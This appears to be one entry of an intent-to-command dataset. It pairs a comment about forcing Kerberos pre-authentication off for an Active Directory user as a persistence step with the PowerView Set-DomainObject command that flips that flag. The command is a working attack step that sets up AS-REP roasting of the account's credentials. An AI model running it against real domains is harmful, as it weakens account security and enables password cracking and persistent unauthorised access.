# Natural language intent:
# Persistence Force preauth not required for a user where you have GenericAll permissions (or permissions to write properties):

Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
